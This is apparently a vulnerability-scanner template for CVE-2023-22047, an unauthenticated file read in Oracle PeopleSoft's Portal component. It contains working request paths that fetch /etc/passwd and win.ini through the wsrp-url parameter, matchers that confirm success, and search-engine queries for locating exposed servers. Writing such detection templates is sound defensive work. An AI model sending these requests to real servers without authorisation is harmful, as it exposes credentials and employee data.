http:
- matchers:
  - condition: or
    regex:
    - 'root:.*:0:0:'
    - bit app support
    type: regex
  - part: content_type
    type: word
    words:
    - content/unknown
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/RP?wsrp-url=file:///etc/passwd'
  - '{{BaseURL}}/RP?wsrp-url=file:///c:\windows\win.ini'
  stop-at-first-match: true
id: CVE-2023-22047
info:
  author: tuo4n8
  classification:
    cpe: cpe:2.3:a:oracle:peoplesoft_enterprise:8.59:*:*:*:*:*:*:*
    cve-id: CVE-2023-22047
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    epss-percentile: 0.99641
    epss-score: 0.91427
  description: 'Vulnerability in the PeopleSoft Enterprise PeopleTools product of
    Oracle PeopleSoft (component- Portal).  Supported versions that are affected are
    8.59 and  8.60. Easily exploitable vulnerability allows unauthenticated attacker
    with network access via HTTP to compromise PeopleSoft Enterprise PeopleTools.  Successful
    attacks of this vulnerability can result in  unauthorized access to critical data
    or complete access to all PeopleSoft Enterprise PeopleTools accessible data.

    '
  impact: 'Unauthenticated attackers can read arbitrary files from the PeopleSoft
    server through the wsrp-url parameter in the Portal component, potentially accessing
    critical data including configuration files and sensitive employee information.

    '
  metadata:
    fofa-query: title="oracle peoplesoft enterprise"
    google-query: intitle:"oracle peoplesoft enterprise"
    max-request: 2
    product: peoplesoft_enterprise
    shodan-query: http.title:"oracle peoplesoft enterprise"
    vendor: oracle
    verified: true
  name: Oracle Peoplesoft - Unauthenticated File Read
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2023-22047
  - https://x.com/tuo4n8/status/1907279143517266286
  remediation: 'Update Oracle PeopleSoft Enterprise PeopleTools to a version newer
    than 8.60 that validates and restricts file:// URLs in the wsrp-url parameter.

    '
  severity: high
  tags: cve,cve2023,oracle,peoplesoft,lfi,vuln
